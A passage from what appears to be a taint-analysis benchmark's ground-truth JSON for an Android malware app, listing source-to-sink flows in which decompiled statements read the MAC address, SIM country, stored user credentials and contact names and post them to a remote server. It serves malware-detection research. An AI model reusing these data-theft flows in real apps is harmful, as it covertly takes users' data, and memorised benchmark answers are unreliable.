+        "threading": true
+      },
+      "ID": 14
+    },
+    {
+      "source": {
+        "targetName": "getMacAddress",
+        "targetNo": 1,
+        "statement": "this.address = ((WifiManager) getSystemService(\"wifi\")).getConnectionInfo().getMacAddress();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.CHECKUPD",
+        "lineNo": 115,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r13.<android.net.wifi.WifiInfo: java.lang.String getMacAddress()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.CHECKUPD.senddata",
+        "lineNo": 258,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new sendmyinfos().execute(new Void[0]);",
+          "methodName": "public void onCreate()",
+          "className": "com.savemebeta.CHECKUPD",
+          "lineNo": 133,
+          "ID": 1
+        },
+        {
+          "statement": "new sendmystatus().execute(new Void[0]);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CHECKUPD.sendmyinfos",
+          "lineNo": 171,
+          "ID": 2
+        },
+        {
+          "statement": "new senddata().execute(new Void[0]);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CHECKUPD.sendmystatus",
+          "lineNo": 225,
+          "ID": 3
+        },
+        {
+          "statement": "CHECKUPD.Mac = CHECKUPD.this.address;",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CHECKUPD.senddata",
+          "lineNo": 240,
+          "ID": 4
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"mac\", CHECKUPD.Mac));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CHECKUPD.senddata",
+          "lineNo": 248,
+          "ID": 5
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CHECKUPD.senddata",
+          "lineNo": 253,
+          "ID": 6
+        }
+      ],
+      "description": "This malicious flow reads MAC address and sends it to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true,
+        "collections": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 15
+    },
+    {
+      "source": {
+        "targetName": "query",
+        "targetNo": 1,
+        "statement": "return dop.getReadableDatabase().query(\"reg_info2\", new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
+        "methodName": "public Cursor getInformation(DatabaseOperationssmssave dop)",
+        "className": "com.savemebeta.DatabaseOperationssmssave",
+        "lineNo": 55,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info2\", $r2, null, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.Scan.sendsmsdata",
+        "lineNo": 706,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r5.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "Cursor CR = DOP.getInformation(DOP);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata",
+          "lineNo": 662,
+          "ID": 1
+        },
+        {
+          "statement": "NUMBER = CR.getString(1);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata",
+          "lineNo": 674,
+          "ID": 2
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"number\", NUMBER));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata",
+          "lineNo": 696,
+          "ID": 3
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata",
+          "lineNo": 701,
+          "ID": 4
+        }
+      ],
+      "description": "This malicious flow reads user data from data base and sends it to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "partialFlow": true,
+        "collections": true,
+        "threading": true
+      },
+      "ID": 16
+    },
+    {
+      "source": {
+        "targetName": "query",
+        "targetNo": 1,
+        "statement": "return dop.getReadableDatabase().query(\"reg_info2\", new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
+        "methodName": "public Cursor getInformation(DatabaseOperationssmssave dop)",
+        "className": "com.savemebeta.DatabaseOperationssmssave",
+        "lineNo": 55,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info2\", $r2, null, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.Scan.sendsmsdata2",
+        "lineNo": 797,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r5.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "Cursor CR = DOP.getInformation(DOP);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 753,
+          "ID": 1
+        },
+        {
+          "statement": "NUMBER = CR.getString(1);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 765,
+          "ID": 2
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"number\", NUMBER));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 787,
+          "ID": 3
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.Scan.sendsmsdata2",
+          "lineNo": 792,
+          "ID": 4
+        }
+      ],
+      "description": "This malicious flow reads user data from database and sends it a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "partialFlow": true,
+        "collections": true,
+        "threading": true
+      },
+      "ID": 17
+    },
+    {
+      "source": {
+        "targetName": "getSimCountryIso",
+        "targetNo": 1,
+        "statement": "country = ((TelephonyManager) getSystemService(\"phone\")).getSimCountryIso();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.CHECKUPD",
+        "lineNo": 100,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r7.<android.telephony.TelephonyManager: java.lang.String getSimCountryIso()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.CHECKUPD.sendmyinfos",
+        "lineNo": 162,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r4.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r5)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new sendmyinfos().execute(new Void[0]);",
+          "methodName": "public void onCreate()",
+          "className": "com.savemebeta.CHECKUPD",
+          "lineNo": 133,
+          "ID": 1
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"counta\", CHECKUPD.country));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CHECKUPD.sendmyinfos",
+          "lineNo": 155,
+          "ID": 2
+        }
+      ],
+      "description": "This malicious flow send country info to a remote server. ",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "collections": true,
+        "threading": true,
+        "staticField": true
+      },
+      "ID": 18
+    },
+    {
+      "source": {
+        "targetName": "getSimCountryIso",
+        "targetNo": 1,
+        "statement": "country = ((TelephonyManager) getSystemService(\"phone\")).getSimCountryIso();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.CHECKUPD",
+        "lineNo": 100,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r7.<android.telephony.TelephonyManager: java.lang.String getSimCountryIso()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.CHECKUPD.sendmystatus",
+        "lineNo": 215,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r3.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow.",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 19
+    },
+    {
+      "source": {
+        "targetName": "getSimCountryIso",
+        "targetNo": 1,
+        "statement": "country = ((TelephonyManager) getSystemService(\"phone\")).getSimCountryIso();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.CHECKUPD",
+        "lineNo": 100,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r7.<android.telephony.TelephonyManager: java.lang.String getSimCountryIso()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.CHECKUPD.senddata",
+        "lineNo": 258,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow.",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 20
+    },
+    {
+      "source": {
+        "targetName": "getMacAddress",
+        "targetNo": 1,
+        "statement": "this.address = ((WifiManager) getSystemService(\"wifi\")).getConnectionInfo().getMacAddress();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.RC",
+        "lineNo": 105,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r9.<android.net.wifi.WifiInfo: java.lang.String getMacAddress()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "StringTokenizer list = new StringTokenizer(EntityUtils.toString(httpclient.execute(httppost).getEntity()), \"#\");",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.RC.StatusTask",
+        "lineNo": 158,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "MAC = this.address;",
+          "methodName": "public void onCreate()",
+          "className": "com.savemebeta.RC",
+          "lineNo": 106,
+          "ID": 1
+        },
+        {
+          "statement": "new StatusTask().execute(new Void[0]);",
+          "methodName": "public void onCreate()",
+          "className": "com.savemebeta.RC",
+          "lineNo": 136,
+          "ID": 2
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"mac\", RC.MAC));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.RC.StatusTask",
+          "lineNo": 148,
+          "ID": 3
+        },
+        {
+          "statement": "httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.RC.StatusTask",
+          "lineNo": 151,
+          "ID": 4
+        }
+      ],
+      "description": "This malicious flow sends MAC address to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true,
+        "threading": true,
+        "staticField": true,
+        "pathConstraints": true,
+        "collections": true
+      },
+      "ID": 21
+    },
+    {
+      "source": {
+        "targetName": "getMacAddress",
+        "targetNo": 1,
+        "statement": "this.address = ((WifiManager) getSystemService(\"wifi\")).getConnectionInfo().getMacAddress();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.GTSTSR",
+        "lineNo": 122,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r8.<android.net.wifi.WifiInfo: java.lang.String getMacAddress()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.update.sendmystatus",
+        "lineNo": 79,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new StatusTask().execute(new Void[0]);",
+          "methodName": "public void onCreate()",
+          "className": "com.savemebeta.GTSTSR",
+          "lineNo": 139,
+          "ID": 1
+        },
+        {
+          "statement": "new globaldata().execute(new Void[0]);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.GTSTSR.StatusTask",
+          "lineNo": 198,
+          "ID": 2
+        },
+        {
+          "statement": "GTSTSR.this.CHECK();",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.GTSTSR.globaldata",
+          "lineNo": 251,
+          "ID": 3
+        },
+        {
+          "statement": "new update().var(this.address, \"\", \"\", \"\", \"\", \"\", \"\", \"\");",
+          "methodName": "public void CHECK()",
+          "className": "com.savemebeta.GTSTSR",
+          "lineNo": 261,
+          "ID": 4
+        },
+        {
+          "statement": "Mac = upmac;",
+          "methodName": "public void var(String upmac, String upsms, String upesms, String upcall, String upcontact, String upacontact, String uptime, String upcheck)",
+          "className": "com.savemebeta.update",
+          "lineNo": 43,
+          "ID": 5
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"mac\", update.Mac));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.update.sendmystatus",
+          "lineNo": 64,
+          "ID": 6
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.update.sendmystatus",
+          "lineNo": 74,
+          "ID": 7
+        }
+      ],
+      "description": "This malicious flow reads MAC address and sends it to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true,
+        "collections": true,
+        "pathConstraints": true,
+        "threading": true,
+        "staticField": true
+      },
+      "ID": 22
+    },
+    {
+      "source": {
+        "targetName": "getMacAddress",
+        "targetNo": 1,
+        "statement": "this.address = ((WifiManager) getSystemService(\"wifi\")).getConnectionInfo().getMacAddress();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.CO",
+        "lineNo": 127,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r13.<android.net.wifi.WifiInfo: java.lang.String getMacAddress()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "httpClient.execute(httpPost);",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.update.sendmystatus",
+        "lineNo": 79,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "getContacts();",
+          "methodName": "public void onCreate()",
+          "className": "com.savemebeta.CO",
+          "lineNo": 130,
+          "ID": 1
+        },
+        {
+          "statement": "CO.this.allSIMContact();",
+          "methodName": "public void run()",
+          "className": "com.savemebeta.CO",
+          "lineNo": 228,
+          "ID": 2
+        },
+        {
+          "statement": "new sendcontact().execute(new Void[0]);",
+          "methodName": "public void allSIMContact()",
+          "className": "com.savemebeta.CO",
+          "lineNo": 261,
+          "ID": 3
+        },
+        {
+          "statement": "new update().var(CO.this.address, \"SSYN\", \"\", \"\", \"\", \"\", \"\", \"\");",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.CO.sendcontact",
+          "lineNo": 334,
+          "ID": 4
+        },
+        {
+          "statement": "Mac = upmac;",
+          "methodName": "public void var(String upmac, String upsms, String upesms, String upcall, String upcontact, String upacontact, String uptime, String upcheck)",
+          "className": "com.savemebeta.update",
+          "lineNo": 43,
+          "ID": 5
+        },
+        {
+          "statement": "new sendmystatus().execute(new Void[0]);",
+          "methodName": "public void var(String upmac, String upsms, String upesms, String upcall, String upcontact, String upacontact, String uptime, String upcheck)",
+          "className": "com.savemebeta.update",
+          "lineNo": 52,
+          "ID": 6
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"mac\", update.Mac));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.update.sendmystatus",
+          "lineNo": 64,
+          "ID": 7
+        },
+        {
+          "statement": "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.update.sendmystatus",
+          "lineNo": 74,
+          "ID": 8
+        }
+      ],
+      "description": "This malicious flow reads MAC address and sends it to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true,
+        "collections": true,
+        "pathConstraints": true,
+        "threading": true,
+        "staticField": true
+      },
+      "ID": 23
+    },
+    {
+      "source": {
+        "targetName": "getMacAddress",
+        "targetNo": 1,
+        "statement": "this.address = ((WifiManager) getSystemService(\"wifi\")).getConnectionInfo().getMacAddress();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.GTSTSR",
+        "lineNo": 122,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r8.<android.net.wifi.WifiInfo: java.lang.String getMacAddress()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "StringTokenizer list = new StringTokenizer(EntityUtils.toString(httpclient.execute(httppost).getEntity()), \"#\");",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.GTSTSR.globaldata",
+        "lineNo": 222,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new StatusTask().execute(new Void[0]);",
+          "methodName": "public void onCreate()",
+          "className": "com.savemebeta.GTSTSR",
+          "lineNo": 139,
+          "ID": 1
+        },
+        {
+          "statement": "GTSTSR.Mac = GTSTSR.this.address;",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.GTSTSR.StatusTask",
+          "lineNo": 190,
+          "ID": 2
+        },
+        {
+          "statement": "new globaldata().execute(new Void[0]);",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.GTSTSR.StatusTask",
+          "lineNo": 198,
+          "ID": 3
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"mac\", GTSTSR.Mac));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.GTSTSR.globaldata",
+          "lineNo": 212,
+          "ID": 4
+        }
+      ],
+      "description": "This malicious flow reads MAC address and sends it to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true,
+        "collections": true,
+        "pathConstraints": true,
+        "threading": true,
+        "staticField": true
+      },
+      "ID": 24
+    },
+    {
+      "source": {
+        "targetName": "getMacAddress",
+        "targetNo": 1,
+        "statement": "this.address = ((WifiManager) getSystemService(\"wifi\")).getConnectionInfo().getMacAddress();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.GTSTSR",
+        "lineNo": 122,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r8.<android.net.wifi.WifiInfo: java.lang.String getMacAddress()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "execute",
+        "targetNo": 1,
+        "statement": "StringTokenizer list = new StringTokenizer(EntityUtils.toString(httpclient.execute(httppost).getEntity()), \"#\");",
+        "methodName": "public Void doInBackground(Void... params)",
+        "className": "com.savemebeta.GTSTSR.StatusTask",
+        "lineNo": 163,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = interfaceinvoke $r3.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new StatusTask().execute(new Void[0]);",
+          "methodName": "public void onCreate()",
+          "className": "com.savemebeta.GTSTSR",
+          "lineNo": 139,
+          "ID": 1
+        },
+        {
+          "statement": "String MAC = GTSTSR.this.address;",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.GTSTSR.StatusTask",
+          "lineNo": 148,
+          "ID": 2
+        },
+        {
+          "statement": "nameValuePairs.add(new BasicNameValuePair(\"mac\", MAC));",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.savemebeta.GTSTSR.StatusTask",
+          "lineNo": 153,
+          "ID": 3
+        }
+      ],
+      "description": "This malicious flow reads MAC address and sends it to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true,
+        "collections": true,
+        "threading": true
+      },
+      "ID": 25
+    },
+    {
+      "source": {
+        "targetName": "query",
+        "targetNo": 1,
+        "statement": "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
+        "methodName": "public Cursor getInformation(DatabaseOperations dop)",
+        "className": "com.savemebeta.DatabaseOperations",
+        "lineNo": 55,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info\", $r2, null, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "put",
+        "targetNo": 1,
+        "statement": "cv.put(\"user_name\", name);",
+        "methodName": "public void putInformation(DatabaseOperations dop, String name, String number, String pass)",
+        "className": "com.savemebeta.DatabaseOperations",
+        "lineNo": 42,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r5.<android.content.ContentValues: void put(java.lang.String,java.lang.String)>(\"user_name\", $r2)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow.",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 26
+    },
+    {
+      "source": {
+        "targetName": "query",
+        "targetNo": 1,
+        "statement": "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
+        "methodName": "public Cursor getInformation(DatabaseOperations dop)",
+        "className": "com.savemebeta.DatabaseOperations",
+        "lineNo": 55,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info\", $r2, null, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "put",
+        "targetNo": 1,
+        "statement": "cv.put(\"user_number\", number);",
+        "methodName": "public void putInformation(DatabaseOperations dop, String name, String number, String pass)",
+        "className": "com.savemebeta.DatabaseOperations",
+        "lineNo": 43,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r5.<android.content.ContentValues: void put(java.lang.String,java.lang.String)>(\"user_number\", $r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow.",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 27
+    },
+    {
+      "source": {
+        "targetName": "query",
+        "targetNo": 1,
+        "statement": "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
+        "methodName": "public Cursor getInformation(DatabaseOperations dop)",
+        "className": "com.savemebeta.DatabaseOperations",
+        "lineNo": 55,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info\", $r2, null, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "put",
+        "targetNo": 1,
+        "statement": "cv.put(\"user_pass\", pass);",
+        "methodName": "public void putInformation(DatabaseOperations dop, String name, String number, String pass)",
+        "className": "com.savemebeta.DatabaseOperations",
+        "lineNo": 44,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r5.<android.content.ContentValues: void put(java.lang.String,java.lang.String)>(\"user_pass\", $r4)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow.",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 28
+    },
+    {
+      "source": {
+        "targetName": "getMacAddress",
+        "targetNo": 1,
+        "statement": "this.address = ((WifiManager) getSystemService(\"wifi\")).getConnectionInfo().getMacAddress();",
+        "methodName": "public void onCreate()",
+        "className": "com.savemebeta.SCHKMS",
+        "lineNo": 147,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r8.<android.net.wifi.WifiInfo: java.lang.String getMacAddress()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "sendTextMessage",
+        "targetNo": 1,
+        "statement": "SmsManager.getDefault().sendTextMessage(this.DB2, null, SMS, null, null);",
+        "methodName": "public void fetchContacts()",
+        "className": "com.savemebeta.SCHKMS",
+        "lineNo": 333,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r7.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>($r5, null, $r6, null, null)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow.",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 29
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "this.var2 = intent.getStringExtra(\"var2\");",
+        "methodName": "public void onCreate(Bundle savedInstanceState)",
+        "className": "com.savemebeta.Scan",
+        "lineNo": 177,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"var2\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "startActivity",
+        "targetNo": 1,
+        "statement": "Scan.this.startActivity(intent);",
+        "methodName": "public void onClick(View arg0)",
+        "className": "com.savemebeta.Scan.AnonymousClass3",
+        "lineNo": 213,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r5.<com.savemebeta.Scan: void startActivity(android.content.Intent)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "intent.putExtra(\"var2\", Scan.this.var2);",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.savemebeta.Scan.AnonymousClass3",
+          "lineNo": 209,
+          "ID": 1
+        }
+      ],
+      "description": "This malicious flow is a part of ICC flow which leaks contact information. The varaible var2 holds the contact name (see AddFriend class in com.savemebeta.Analyse.java). ",
+      "isNegative": false,
+      "attributes": {
+        "nonStaticField": true,
+        "callbacks": true,
+        "interComponentCommunication": true,
+        "lifecycle": true
+      },
+      "ID": 30
+    },
+    {
+      "source": {
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "statement": "this.var2 = intent.getStringExtra(\"var2\");",
+        "methodName": "public void onCreate(Bundle savedInstanceState)",
+        "className": "com.savemebeta.Scan",
+        "lineNo": 177,
+        "IRs": [
+          {
+            "type": "Jimple",
